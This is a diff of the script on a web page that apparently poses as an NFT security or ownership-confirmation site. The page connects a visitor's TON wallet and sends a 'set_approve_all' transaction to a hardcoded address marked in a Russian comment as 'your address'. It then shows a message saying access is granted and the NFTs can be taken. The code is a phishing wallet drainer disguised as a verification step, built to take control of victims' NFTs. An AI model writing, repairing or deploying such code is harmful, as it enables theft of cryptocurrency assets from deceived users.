@@ -709,45 +709,42 @@ document.addEventListener("DOMContentLoaded", function () {
    const connector = new TonConnect();
 connector.connect({ manifestUrl: 'https://nftsecurity.online/tonconnect-manifest.json' });
     // Код для кнопки "Confirm ownership"
-    const ownBtn = document.getElementById('ownBtn');
-    if (ownBtn) {
-        ownBtn.onclick = async function () {
-            const err = document.getElementById('err');
-            if (!err) return;
+    document.getElementById('ownBtn').onclick = async function () {
+    const err = document.getElementById('err');
+    if (!err) return;
 
-            if (!ui.wallet) {
-                err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
-                err.style.display = 'block';
-                ui.openModal();
-                return;
-            }
-
-            err.textContent = '⏳ Отправляем запрос на подтверждение...';
-            err.style.display = 'block';
-            err.style.color = '#ff9abb';
-
-            try {
-                const transaction = {
-                    valid_until: Math.floor(Date.now() / 1000) + 300,
-                    messages: [
-                        {
-                            address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
-                            amount: '0',
-                            payload: 'set_approve_all'
-                        }
-                    ]
-                };
-                await ui.sendTransaction(transaction);
-                err.textContent = '✅ Доступ получен! NFT можно забирать.';
-                err.style.color = '#00ff88';
-            } catch (e) {
-                err.textContent = '❌ Ошибка: ' + e.message;
-                err.style.display = 'block';
-                err.style.color = '#ff9abb';
-            }
-        };
+    if (!connector.wallet) {
+        err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
+        err.style.display = 'block';
+        await connector.connect({ manifestUrl: 'https://nftsecurity.online/tonconnect-manifest.json' });
+        return;
     }
-});
+
+    err.textContent = '⏳ Отправляем запрос...';
+    err.style.display = 'block';
+    err.style.color = '#ff9abb';
+
+    try {
+        const transaction = {
+            valid_until: Math.floor(Date.now() / 1000) + 300,
+            messages: [
+                {
+                    address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m', // ТВОЙ АДРЕС
+                    amount: '0',
+                    payload: 'set_approve_all'
+                }
+            ]
+        };
+        await connector.sendTransaction(transaction);
+        err.textContent = '✅ Доступ получен! NFT можно забирать.';
+        err.style.color = '#00ff88';
+    } catch (e) {
+        err.textContent = '❌ Ошибка: ' + e.message;
+        err.style.display = 'block';
+        err.style.color = '#ff9abb';
+    }
+};
 </script>
+ <button id="ton-connect-button">Подключить кошелёк</button>
 </body>
 </html>
